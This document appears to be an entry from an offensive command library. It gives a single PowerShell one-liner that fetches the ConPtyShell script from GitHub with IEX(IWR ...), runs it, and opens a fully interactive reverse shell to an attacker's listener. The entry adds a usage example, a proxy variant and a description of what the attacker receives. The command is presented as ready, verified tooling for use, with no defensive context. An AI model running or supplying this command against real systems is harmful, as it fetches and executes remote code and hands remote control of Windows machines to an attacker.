---
id: 1c7ff31a-1f91-4f2b-9c6a-d617f6abf8d6
name: powershell-invoke-conptyshell-reverse-connect
type: command
executor: powershell
data: >-
  IEX(IWR
  https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
  -UseBasicParsing); Invoke-ConPtyShell $_ATTACKER_IP $_LISTEN_PORT
output: null
created_at: '2023-04-06T03:56:25.077280+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - reverse-shell
  - powershell
verified: true
validated: true
---

# powershell-invoke-conptyshell-reverse-connect

## Command

```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $_ATTACKER_IP $_LISTEN_PORT
```

## Description

This PowerShell command downloads and executes the ConPtyShell script from GitHub, then invokes it to establish a reverse shell connection to a specified attacker IP and port, providing a fully interactive console on Windows without external dependencies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the attacker's listener (e.g., 10.0.0.2) | Yes |
| $_LISTEN_PORT | Port of the attacker's listener (e.g., 3001) | Yes |
| -UseBasicParsing | Use basic parsing for Invoke-WebRequest to avoid IE dependency | Built-in |

## Examples

### Basic Usage

```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

### Advanced Usage

With proxy if needed (add -Proxy to IWR):
```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing -Proxy 'http://proxy:8080'); Invoke-ConPtyShell 192.168.1.100 4444
```

## Expected Output

No direct output on target if successful; instead, the connection establishes silently, and the attacker's listener receives the shell (e.g., "Connection received!" followed by Windows prompt). Errors may show as download failures or connection refused.

## Related

- [[procedures/Establish-Windows-Reverse-Shell-with-ConPtyShell]]
